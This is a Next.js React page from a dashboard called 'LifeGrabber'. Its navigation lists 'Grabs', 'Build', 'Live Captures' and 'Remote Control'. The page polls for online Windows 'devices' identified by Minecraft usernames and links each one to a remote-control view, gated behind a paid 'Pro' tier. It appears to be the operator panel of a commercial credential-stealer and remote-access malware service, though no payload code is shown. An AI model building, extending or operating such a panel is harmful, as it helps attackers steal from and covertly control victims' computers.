'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';

const colors = {
  bg: '#0a0a0f',
  surface: '#12121a',
  surfaceHover: '#1a1a24',
  border: 'rgba(255,255,255,0.06)',
  borderHover: 'rgba(255,255,255,0.12)',
  text: '#f0f0f0',
  textDim: '#6b6e7b',
  green: '#22c55e',
  greenBg: 'rgba(34, 197, 94, 0.12)',
  red: '#ef4444',
};

function NavItem({ icon, label, active, onClick }) {
  return (
    <div onClick={onClick} style={{
      display: 'flex', alignItems: 'center', gap: 10, padding: '10px 14px', borderRadius: 8,
      background: active ? 'rgba(34, 197, 94, 0.08)' : 'transparent',
      color: active ? colors.green : colors.textDim, fontSize: 14, cursor: 'pointer', marginBottom: 2,
    }}
    onMouseEnter={e => { if (!active) { e.currentTarget.style.background = 'rgba(255,255,255,0.03)'; e.currentTarget.style.color = colors.text; } }}
    onMouseLeave={e => { if (!active) { e.currentTarget.style.background = 'transparent'; e.currentTarget.style.color = colors.textDim; } }}
    >
      <span style={{ fontSize: 16, width: 20, textAlign: 'center' }}>{icon}</span>
      <span>{label}</span>
    </div>
  );
}

function getGreeting() {
  const h = new Date().getHours();
  if (h < 12) return 'Good morning';
  if (h < 18) return 'Good afternoon';
  return 'Good evening';
}

export default function RemoteControlPage() {
  const router = useRouter();
  const [onlineUsers, setOnlineUsers] = useState([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState('');
  const [userEmail, setUserEmail] = useState('');
  const [isPro, setIsPro] = useState(false);
  const [proChecked, setProChecked] = useState(false);

  useEffect(() => {
    fetch('/api/auth/user')
      .then(r => r.json())
      .then(d => {
        if (d.user?.email) {
          setUserEmail(d.user.email);
          if (d.user.email === 'lifegrading@gmail.com') {
            setIsPro(true);
            setProChecked(true);
          } else {
            fetch('/api/user/pro')
              .then(r => r.json())
              .then(p => { setIsPro(p.is_pro); setProChecked(true); })
              .catch(() => { setIsPro(false); setProChecked(true); });
          }
        } else {
          setProChecked(true);
        }
      })
      .catch(() => setProChecked(true));
  }, []);

  if (!proChecked) {
    return (
      <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>Loading...</div>
      </div>
    );
  }

  if (!isPro && userEmail !== 'lifegrading@gmail.com') {
    return (
      <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', flexDirection: 'column', gap: 16 }}>
          <div style={{ fontSize: 48 }}>🔒</div>
          <div style={{ fontSize: 18, fontWeight: 600 }}>Pro Required</div>
          <div style={{ fontSize: 14, color: colors.textDim, textAlign: 'center', maxWidth: 400 }}>
            Remote Control is only available for Pro users. Free trials cannot access this feature.
          </div>
          <button onClick={() => router.push('/dashboard')} style={{ cursor: 'pointer', background: colors.green, color: '#000', border: 'none', borderRadius: 8, padding: '10px 20px', fontSize: 13, fontWeight: 600 }}>Upgrade to Pro</button>
          <div onClick={() => router.push('/dashboard')} style={{ cursor: 'pointer', color: colors.textDim, fontSize: 14, marginTop: 8 }}>← Back to Dashboard</div>
        </div>
      </div>
    );
  }

  useEffect(() => {
    fetch('/api/stream')
      .then(r => r.json())
      .then(d => { setOnlineUsers(d.online || []); setLoading(false); })
      .catch(() => setLoading(false));

    const iv = setInterval(() => {
      fetch('/api/stream').then(r => r.json()).then(d => setOnlineUsers(d.online || [])).catch(() => {});
    }, 3000);
    return () => clearInterval(iv);
  }, []);

  const filtered = onlineUsers.filter(u => u.username.toLowerCase().includes(search.toLowerCase()));

  return (
    <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
      <aside style={{ width: 220, borderRight: `1px solid ${colors.border}`, padding: '20px 12px', display: 'flex', flexDirection: 'column', background: colors.surface }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '0 10px', marginBottom: 28 }}>
          <div style={{ width: 28, height: 28, borderRadius: 6, background: 'rgba(34, 197, 94, 0.15)' }} />
          <span style={{ fontSize: 14, fontWeight: 600 }}>LifeGrabber</span>
        </div>
        <div style={{ flex: 1 }}>
          <NavItem icon="📊" label="Dashboard" onClick={() => router.push('/dashboard')} />
          <NavItem icon="⚡" label="Grabs" onClick={() => router.push('/dashboard/grabs')} />
          <NavItem icon="🔨" label="Build" onClick={() => router.push('/dashboard/build')} />
          <NavItem icon="📡" label="Live Captures" onClick={() => router.push('/dashboard')} />
          <NavItem icon="🖥" label="Remote Control" active onClick={() => router.push('/dashboard/remote-control')} />
          <NavItem icon="⚙️" label="Settings" onClick={() => router.push('/dashboard/settings')} />
        </div>
        <div>
          <NavItem icon="🚪" label="Log out" onClick={() => window.location.href = '/api/auth/logout'} />
        </div>
      </aside>

      <main style={{ flex: 1, padding: '32px 40px' }}>
        <h1 style={{ fontSize: 26, fontWeight: 700, margin: 0 }}>{getGreeting()}, there.</h1>
        <p style={{ color: colors.textDim, fontSize: 14, marginTop: 4, marginBottom: 28 }}>Your workspace is ready.</p>

        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 20 }}>
          <span style={{ fontSize: 14, color: colors.textDim }}>{onlineUsers.length} available device{onlineUsers.length !== 1 ? 's' : ''} for remote control</span>
          <div style={{ position: 'relative' }}>
            <span style={{ position: 'absolute', left: 12, top: '50%', transform: 'translateY(-50%)', color: colors.textDim, fontSize: 14 }}>🔍</span>
            <input
              placeholder="Search devices..."
              value={search}
              onChange={e => setSearch(e.target.value)}
              style={{
                background: colors.surface,
                border: `1px solid ${colors.border}`,
                borderRadius: 8,
                padding: '8px 14px 8px 34px',
                color: colors.text,
                fontSize: 13,
                width: 200,
                outline: 'none',
              }}
              onFocus={e => e.target.style.borderColor = colors.borderHover}
              onBlur={e => e.target.style.borderColor = colors.border}
            />
          </div>
        </div>

        {loading ? (
          <div style={{ background: colors.surface, border: `1px solid ${colors.border}`, borderRadius: 12, height: 200, display: 'flex', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>Loading...</div>
        ) : filtered.length === 0 ? (
          <div style={{ background: colors.surface, border: `1px solid ${colors.border}`, borderRadius: 12, height: 200, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
            <span style={{ fontSize: 28, marginBottom: 8 }}>{onlineUsers.length === 0 ? '📡' : '🔍'}</span>
            <span style={{ fontSize: 14 }}>{onlineUsers.length === 0 ? 'No devices online' : 'No devices match your search'}</span>
          </div>
        ) : (
          <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
            {filtered.map(u => (
              <div key={u.username} onClick={() => router.push('/dashboard/remote-control/' + encodeURIComponent(u.username))} style={{
                background: colors.surface,
                border: `1px solid ${colors.border}`,
                borderRadius: 12,
                padding: '14px 18px',
                display: 'flex',
                alignItems: 'center',
                gap: 14,
                cursor: 'pointer',
                transition: 'all 0.15s ease',
              }}
              onMouseEnter={e => { e.currentTarget.style.background = colors.surfaceHover; e.currentTarget.style.borderColor = colors.borderHover; }}
              onMouseLeave={e => { e.currentTarget.style.background = colors.surface; e.currentTarget.style.borderColor = colors.border; }}
              >
                <div style={{ position: 'relative' }}>
                  <img src={'https://mc-heads.net/avatar/' + u.username + '/40'} alt="" style={{ width: 40, height: 40, borderRadius: 8 }} />
                  <div style={{ position: 'absolute', bottom: -2, right: -2, width: 12, height: 12, borderRadius: '50%', background: colors.green, border: `2px solid ${colors.surface}` }} />
                </div>
                <div style={{ flex: 1 }}>
                  <div style={{ fontSize: 15, fontWeight: 600 }}>{u.username}</div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginTop: 2 }}>
                    <span style={{ display: 'inline-flex', alignItems: 'center', gap: 4, fontSize: 11, color: colors.textDim, background: 'rgba(255,255,255,0.05)', padding: '2px 8px', borderRadius: 4 }}>
                      <span style={{ fontSize: 12 }}>🪟</span> Windows
                    </span>
                  </div>
                </div>
                <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                  <span style={{ fontSize: 12, color: colors.green, background: colors.greenBg, padding: '4px 10px', borderRadius: 6, fontWeight: 500 }}>Online</span>
                  <span style={{ color: colors.textDim, fontSize: 18 }}>→</span>
                </div>
              </div>
            ))}
          </div>
        )}
      </main>
    </div>
  );
}